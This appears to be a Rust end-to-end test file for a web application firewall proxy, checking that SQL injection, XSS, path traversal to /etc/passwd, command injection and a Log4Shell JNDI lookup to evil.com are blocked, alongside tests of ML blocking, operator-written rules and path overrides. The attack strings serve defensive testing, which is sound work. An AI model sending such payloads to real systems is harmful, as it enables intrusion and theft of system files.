//! End-to-end pipeline tests: proxy → WAF → upstream.
//!
//! Spins up a mock upstream and a `ProxyServer`, sends real HTTP
//! requests over TCP, and verifies that attacks are blocked and
//! clean traffic is forwarded.

use std::net::SocketAddr;
use std::path::Path;
use std::sync::Arc;

use arc_swap::ArcSwap;
use http::{header, Method, Request, StatusCode};
use hyper::body::Incoming;
use hyper_util::rt::TokioIo;
use sentinel_core::config::{
    ConfigHandle, ListenerConfig, Protocol, ProtocolSpec, SentinelConfig, SiteConfig,
    UpstreamConfig, UpstreamServer, WafConfig, WafMode,
};
use sentinel_proxy::ProxyServer;
use std::sync::Once;

use tokio::net::TcpListener;

static INIT: Once = Once::new();

/// Install the rustls crypto provider before any tests run.
/// ProxyServer internally uses rustls; this is required by rustls 0.23+.
fn install_crypto() {
    INIT.call_once(|| {
        let _ = rustls::crypto::ring::default_provider().install_default();
    });
}
use tokio::sync::watch;

// Each test needs a unique listen port to avoid bind conflicts.
static NEXT_PORT: std::sync::atomic::AtomicU16 = std::sync::atomic::AtomicU16::new(42080);

fn next_port() -> u16 {
    NEXT_PORT.fetch_add(1, std::sync::atomic::Ordering::SeqCst)
}

fn config_handle(cfg: SentinelConfig) -> ConfigHandle {
    Arc::new(ArcSwap::new(Arc::new(cfg)))
}

fn crs_rule_dir() -> std::path::PathBuf {
    let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
    manifest.join("../../rules/owasp-crs/rules")
}

fn test_config(
    listen_port: u16,
    upstream_port: u16,
    rule_file: &str,
    mode: WafMode,
) -> SentinelConfig {
    let rule_path = crs_rule_dir().join(rule_file);
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
            },
            waf: WafConfig {
                mode,
                rules: vec![rule_path.to_string_lossy().to_string()],
                anomaly_threshold: 5,
                paranoia_level: 2,
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

/// Config for the ML-only test: NO WAF rules are loaded, but the ML engine is
/// enabled. Any block therefore comes purely from ML inference, not the rule
/// engine — proving the ML path works end-to-end in the proxy.
fn ml_only_config(listen_port: u16, upstream_port: u16, sensitivity: f32) -> SentinelConfig {
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
            },
            waf: WafConfig {
                mode: WafMode::Blocking,
                rules: vec![], // no rules — only ML can block
                anomaly_threshold: 3,
                paranoia_level: 2,
                ml: Some(sentinel_core::config::MlConfig {
                    enable: true,
                    models: vec![],
                    sensitivity,
                }),
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

// ---------------------------------------------------------------------------
// mock upstream
// ---------------------------------------------------------------------------

async fn start_mock_upstream() -> (SocketAddr, tokio::task::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind mock upstream");
    let addr = listener.local_addr().unwrap();
    let handle = tokio::spawn(async move {
        loop {
            let (stream, _) = match listener.accept().await {
                Ok(c) => c,
                Err(_) => break,
            };
            tokio::spawn(async move {
                let io = TokioIo::new(stream);
                let svc = hyper::service::service_fn(|req: Request<Incoming>| async move {
                    let path = req.uri().path().to_string();
                    let query = req
                        .uri()
                        .query()
                        .map(|q| format!("?{q}"))
                        .unwrap_or_default();
                    Ok::<_, std::convert::Infallible>(
                        http::Response::builder()
                            .status(StatusCode::OK)
                            .header(header::CONTENT_TYPE, "text/plain")
                            .body(format!("upstream-ok: {path}{query}"))
                            .unwrap(),
                    )
                });
                if let Err(e) = hyper::server::conn::http1::Builder::new()
                    .serve_connection(io, svc)
                    .await
                {
                    if !e.to_string().contains("connection closed") {
                        eprintln!("mock upstream error: {e}");
                    }
                }
            });
        }
    });
    (addr, handle)
}

async fn start_proxy(
    cfg: SentinelConfig,
) -> (
    watch::Sender<bool>,
    tokio::task::JoinHandle<anyhow::Result<()>>,
) {
    install_crypto();
    let handle = config_handle(cfg);
    let proxy = ProxyServer::new(handle);
    let (shutdown_tx, shutdown_rx) = watch::channel(false);
    let jh = tokio::spawn(async move { proxy.run(shutdown_rx).await });
    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
    (shutdown_tx, jh)
}

async fn shutdown_proxy(tx: watch::Sender<bool>, jh: tokio::task::JoinHandle<anyhow::Result<()>>) {
    let _ = tx.send(true);
    let _ = jh.await;
}

async fn send_request(
    listen_port: u16,
    host: &str,
    uri: &str,
    method: Method,
    body: &str,
) -> (StatusCode, Vec<u8>) {
    // Bind a short-lived socket to allocate an ephemeral port for the client.
    // This ensures each test gets a fresh client port, avoiding TIME_WAIT conflicts.
    {
        let _stream = TcpListener::bind("127.0.0.1:0").await.unwrap();
    }

    let tcp = tokio::net::TcpSocket::new_v4()
        .unwrap()
        .connect(std::net::SocketAddr::new(
            std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST),
            listen_port,
        ))
        .await
        .expect("connect to proxy");

    let io = TokioIo::new(tcp);
    let (mut sender, conn) = hyper::client::conn::http1::handshake(io).await.unwrap();
    tokio::spawn(async move { conn.await.unwrap() });

    let req = Request::builder()
        .method(method)
        .uri(uri)
        .header(header::HOST, host)
        .header(
            header::USER_AGENT,
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0",
        );

    let req = if !body.is_empty() {
        req.header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(http_body_util::Full::new(bytes::Bytes::from(
                body.to_string(),
            )))
            .unwrap()
    } else {
        req.body(http_body_util::Full::new(bytes::Bytes::new()))
            .unwrap()
    };

    let resp = sender.send_request(req).await.expect("send request");
    let status = resp.status();

    use http_body_util::BodyExt;
    let body = resp.collect().await.unwrap().to_bytes().to_vec();
    (status, body)
}

// ============================================================================
// E2E Tests
// ============================================================================

#[tokio::test]
async fn clean_request_reaches_upstream() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/hello?name=world",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body.starts_with(b"upstream-ok:"));
}

#[tokio::test]
async fn sqli_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "SQLi attack should be 403");
}

#[tokio::test]
async fn xss_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "XSS attack should be 403");
}

#[tokio::test]
async fn health_check_endpoint() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) =
        send_request(listen_port, "test-site.local", "/healthz", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "healthz should return 200");
}

#[tokio::test]
async fn metrics_endpoint_is_scrapeable() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // Drive one real request first so the counters have moved, then scrape.
    let _ = send_request(listen_port, "test-site.local", "/", Method::GET, "").await;
    let (status, body) =
        send_request(listen_port, "test-site.local", "/metrics", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;

    assert_eq!(status, StatusCode::OK, "/metrics should return 200");
    let text = String::from_utf8(body).expect("metrics body is UTF-8");
    // Prometheus exposition format with the WAF counters present.
    assert!(
        text.contains("# TYPE sentinel_requests_total counter"),
        "expected prometheus TYPE header, got:\n{text}"
    );
    assert!(text.contains("sentinel_requests_total"));
    assert!(text.contains("sentinel_blocked_total"));
    assert!(text.contains("sentinel_active_connections"));
}

#[tokio::test]
async fn post_body_sqli_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/login",
        Method::POST,
        "user=admin' OR 1=1--&pass=foo",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "POST SQLi body should be 403"
    );
}

#[tokio::test]
async fn learning_mode_passes_attack() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Learning,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%20UNION%20SELECT%20*%20FROM%20users",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "learning mode should forward");
    assert!(
        body.starts_with(b"upstream-ok:"),
        "learning mode should reach upstream"
    );
}

#[tokio::test]
async fn e2e_lfi_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/?file=../../etc/passwd",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "LFI attack should be 403");
}

#[tokio::test]
async fn e2e_rce_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-932-APPLICATION-ATTACK-RCE.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/exec?cmd=cat%20/etc/passwd",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "RCE attack should be 403");
}

#[tokio::test]
async fn clean_post_passes_through() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/api/users",
        Method::POST,
        "name=John&email=john@example.com",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "clean POST should pass");
    assert!(body.starts_with(b"upstream-ok:"));
}
// ============================================================================
// ML inference E2E — no WAF rules loaded; only the ML engine can block.
// Proves the trained classifier + anomaly model run on the live request path
// and drive the block decision.
// ============================================================================

#[tokio::test]
async fn e2e_ml_blocks_attack_with_no_rules() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    // sensitivity 0.6: the trained classifier scores SQLi well above this.
    let cfg = ml_only_config(listen_port, upstream_addr.port(), 0.6);
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // Strong SQLi in the body. No SQLi rules are loaded, so only ML can flag it.
    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/login",
        Method::POST,
        "user=admin&q=1' UNION SELECT username,password FROM users-- -",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "ML inference (no rules) should block the SQLi payload, got {status}"
    );
}

#[tokio::test]
async fn e2e_ml_allows_clean_request_with_no_rules() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = ml_only_config(listen_port, upstream_addr.port(), 0.6);
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // A benign request shaped like normal traffic must pass — ML must not be a
    // blanket blocker.
    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/products?page=1&sort=price",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::OK,
        "clean request must pass ML, got {status}"
    );
    assert!(body.starts_with(b"upstream-ok:"));
}

// ---------------------------------------------------------------------------
// Operator-authored (inline) rules from the control plane.
//
// Until 2026-07-28 these were stored in Postgres and never delivered, so a rule
// written in the UI showed as "enabled" and did nothing. These tests exercise the
// delivered path end-to-end through a real proxy, and pin the two failure
// behaviours that decide whether the feature is safe to expose to a customer.
// ---------------------------------------------------------------------------

use sentinel_core::config::InlineRule;

// Real SRL. NOTE: the rule's name IS its numeric id, and the operator form is
// `rx /pattern/` — not the `rule foo { id: N; op: rx("...") }` shape that the
// seeded sample rules use, which does not parse at all.
const LOG4SHELL_SRL: &str = r#"
rule 9999900 {
    phase    : request_body
    targets  : ARGS
    operator : rx /\$\{jndi:/
    action   : block
    severity : critical
    message  : "Log4Shell JNDI lookup"
}
"#;

const MARKER_SRL: &str = r#"
rule 9999901 {
    phase    : request_body
    targets  : ARGS
    operator : rx /EVILMARKER/
    action   : block
    severity : critical
    message  : "test marker"
}
"#;

const SHADOW_SRL: &str = r#"
rule 942100 {
    phase    : request_body
    targets  : ARGS
    operator : rx /NEVERMATCHES/
    action   : log
    severity : info
    message  : "attempted shadow of a shipped rule id"
}
"#;

/// A site carrying ONLY inline rules — no rule files at all — so any block is
/// necessarily produced by the inline path and nothing else.
fn inline_only_config(
    listen_port: u16,
    upstream_port: u16,
    inline: Vec<InlineRule>,
) -> SentinelConfig {
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
            },
            waf: WafConfig {
                mode: WafMode::Blocking,
                rules: vec![],
                inline_rules: inline,
                anomaly_threshold: 5,
                paranoia_level: 2,
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

/// The headline case: a virtual patch written by an operator actually blocks.
/// Modelled on the Log4Shell shape, which is why the feature exists — a CVE lands
/// and waiting for a data-plane image rebuild is not an option.
#[tokio::test]
async fn inline_rule_from_control_plane_is_enforced() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = inline_only_config(
        listen_port,
        upstream_addr.port(),
        vec![InlineRule {
            name: "VP-CVE-2021-44228".into(),
            dsl: LOG4SHELL_SRL.into(),
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (blocked, _) = send_request(
        listen_port,
        "test-site.local",
        "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
        Method::GET,
        "",
    )
    .await;
    let (allowed, _) =
        send_request(listen_port, "test-site.local", "/?x=ok", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        blocked,
        StatusCode::FORBIDDEN,
        "an operator-authored rule must actually block; if this is 200 the rule \
         reached the data plane but was not enforced"
    );
    assert_eq!(
        allowed,
        StatusCode::OK,
        "the inline rule must not block unrelated traffic"
    );
}

/// A rule typed into a web form WILL sometimes be malformed. One bad row must not
/// disarm the rules around it — that would turn an operator typo into an outage,
/// and it is the difference between this feature being safe to expose or not.
#[tokio::test]
async fn one_malformed_inline_rule_does_not_disarm_the_others() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = inline_only_config(
        listen_port,
        upstream_addr.port(),
        vec![
            InlineRule {
                name: "broken-rule".into(),
                dsl: "rule oops { this is not valid SRL at all ((( ".into(),
            },
            InlineRule {
                name: "good-rule".into(),
                dsl: MARKER_SRL.into(),
            },
        ],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/?q=EVILMARKER",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "the valid rule must still be enforced despite a malformed sibling"
    );
}

/// An inline rule reusing a shipped rule's id is refused rather than allowed to
/// shadow it: with two rules answering to one id, an exclusion for that id cannot
/// say which one it means, and scoring silently doubles.
#[tokio::test]
async fn inline_rule_may_not_shadow_a_shipped_rule_id() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();

    // Load the real CRS SQLi file, then try to redefine 942100 as a no-op that
    // would allow traffic the genuine rule blocks.
    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
    let mut cfg = inline_only_config(listen_port, upstream_addr.port(), vec![]);
    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
    cfg.sites[0].waf.inline_rules = vec![InlineRule {
        name: "shadow-942100".into(),
        dsl: SHADOW_SRL.into(),
    }];
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "the shipped 942100 must still block; a colliding inline rule must be \
         refused, not allowed to override it"
    );
}

// ---------------------------------------------------------------------------
// Per-path policy overrides.
//
// A site used to have exactly one policy, so an operator had to pick a single
// strictness that was necessarily wrong for part of the application. These pin
// the three behaviours that make the feature real rather than decorative:
// a stricter path blocks what the site would allow, a detect-only path lets
// through what the site would block, and an off path is genuinely exempt.
// ---------------------------------------------------------------------------

use sentinel_core::config::PathOverride;

/// A site with the CRS SQLi rules, a site-level threshold, and path overrides.
fn path_override_config(
    listen_port: u16,
    upstream_port: u16,
    site_threshold: u32,
    overrides: Vec<PathOverride>,
) -> SentinelConfig {
    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
    let mut cfg = test_config(
        listen_port,
        upstream_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
    cfg.sites[0].waf.anomaly_threshold = site_threshold;
    cfg.sites[0].waf.path_overrides = overrides;
    cfg
}

/// A path in learning mode must pass an attack the rest of the site blocks.
/// This is the "legacy endpoint we are still fixing" case.
#[tokio::test]
async fn path_override_learning_lets_attack_through() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![PathOverride {
            path_prefix: "/legacy/".into(),
            mode: Some(WafMode::Learning),
            anomaly_threshold: None,
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_legacy, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/legacy/report{attack}"),
        Method::GET,
        "",
    )
    .await;
    let (elsewhere, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/search{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        on_legacy,
        StatusCode::OK,
        "/legacy/ is learning-mode: the attack must be recorded, not blocked"
    );
    assert_eq!(
        elsewhere,
        StatusCode::FORBIDDEN,
        "the same attack outside the override must still block"
    );
}

/// A path in `off` mode is genuinely exempt — the case for static assets, where
/// the WAF only costs latency and false positives.
#[tokio::test]
async fn path_override_off_exempts_the_path() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![PathOverride {
            path_prefix: "/assets/".into(),
            mode: Some(WafMode::Off),
            anomaly_threshold: None,
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/assets/app.js?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::OK,
        "an `off` path must pass traffic regardless of what the rules found"
    );
}

/// Longest prefix wins, independently of declaration order — otherwise an
/// operator's policy depends on the order they happened to add rows in, which is
/// not a property a security control may have.
#[tokio::test]
async fn path_override_longest_prefix_wins() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    // The SHORTER, more permissive prefix is declared first on purpose.
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![
            PathOverride {
                path_prefix: "/api/".into(),
                mode: Some(WafMode::Off),
                anomaly_threshold: None,
            },
            PathOverride {
                path_prefix: "/api/admin/".into(),
                mode: Some(WafMode::Blocking),
                anomaly_threshold: None,
            },
        ],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_api, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/list{attack}"),
        Method::GET,
        "",
    )
    .await;
    let (on_admin, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/admin/users{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(on_api, StatusCode::OK, "/api/ is off");
    assert_eq!(
        on_admin,
        StatusCode::FORBIDDEN,
        "/api/admin/ is the longer prefix and must win over /api/ despite being \
         declared second"
    );
}

/// A path may also be made STRICTER than the site. The site threshold is set
/// high enough that the CRS score for this request does not reach it, while the
/// override's lower threshold does — so only the override can produce the block.
#[tokio::test]
async fn path_override_can_be_stricter_than_the_site() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        1000, // effectively "never block on score" for the rest of the site
        vec![PathOverride {
            path_prefix: "/api/".into(),
            mode: None,
            anomaly_threshold: Some(3),
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_api, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/list{attack}"),
        Method::GET,
        "",
    )
    .await;
    let (elsewhere, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/search{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        on_api,
        StatusCode::FORBIDDEN,
        "/api/ has threshold 3 and must block on the accumulated score"
    );
    assert_eq!(
        elsewhere,
        StatusCode::OK,
        "the site threshold of 1000 must still apply outside the override"
    );
}

// ============================================================================
// WebSocket gating (site.upstream.websocket)
//
// The relay used to be ungated: it fired on any 101 from the origin, so a site
// configured with `websocket: false` still got a full bidirectional relay — a
// security control that failed open. These tests pin both directions on the
// wire, not on internal state.
// ============================================================================

/// Mock origin that completes a WebSocket handshake when it is asked to, and
/// otherwise answers as a plain HTTP server.
///
/// The 200 body reports whether ANY `sec-websocket-*` header arrived, which is
/// how the disabled test proves the proxy scrubbed the handshake rather than
/// merely that the origin declined it.
async fn start_ws_mock_upstream() -> (SocketAddr, tokio::task::JoinHandle<()>) {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind ws mock upstream");
    let addr = listener.local_addr().unwrap();
    let handle = tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(c) => c,
                Err(_) => break,
            };
            tokio::spawn(async move {
                // Read just the header block; these requests carry no body.
                let mut buf = Vec::new();
                let mut chunk = [0u8; 1024];
                loop {
                    match stream.read(&mut chunk).await {
                        Ok(0) => return,
                        Ok(n) => {
                            buf.extend_from_slice(&chunk[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => return,
                    }
                }
                let head = String::from_utf8_lossy(&buf).to_ascii_lowercase();
                let asked_to_upgrade =
                    head.contains("upgrade: websocket") && head.contains("connection: upgrade");
                let saw_ws_headers = head.contains("sec-websocket-");

                let resp = if asked_to_upgrade {
                    // Fixed accept value: these tests assert on the status line,
                    // never on a real WebSocket handshake completing.
                    "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\
                     Connection: Upgrade\r\n\
                     Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n"
                        .to_string()
                } else {
                    let body = format!("plain-http ws_headers={saw_ws_headers}");
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    )
                };
                let _ = stream.write_all(resp.as_bytes()).await;
                let _ = stream.flush().await;
            });
        }
    });
    (addr, handle)
}

/// Send a WebSocket handshake over a raw socket and return
/// (status line, body-ish remainder). Raw TCP on purpose: a hyper client would
/// interpret the upgrade for us, and the point is to see what went over the wire.
async fn send_ws_handshake(listen_port: u16, host: &str) -> String {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let mut tcp = tokio::net::TcpStream::connect(("127.0.0.1", listen_port))
        .await
        .expect("connect to proxy");
    let req = format!(
        "GET /socket.io/?transport=websocket HTTP/1.1\r\nHost: {host}\r\n\
         Upgrade: websocket\r\nConnection: Upgrade\r\n\
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 13\r\n\r\n"
    );
    tcp.write_all(req.as_bytes())
        .await
        .expect("write handshake");
    tcp.flush().await.unwrap();

    let mut buf = Vec::new();
    let mut chunk = [0u8; 2048];
    // Read until the peer stops sending or we have the head plus any body.
    for _ in 0..8 {
        match tokio::time::timeout(std::time::Duration::from_millis(600), tcp.read(&mut chunk))
            .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                buf.extend_from_slice(&chunk[..n]);
                if buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() > 40 {
                    break;
                }
            }
            _ => break,
        }
    }
    String::from_utf8_lossy(&buf).to_string()
}

fn ws_test_config(listen_port: u16, upstream_port: u16, websocket: bool) -> SentinelConfig {
    let mut cfg = test_config(
        listen_port,
        upstream_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.sites[0].upstream.websocket = websocket;
    cfg
}

#[tokio::test]
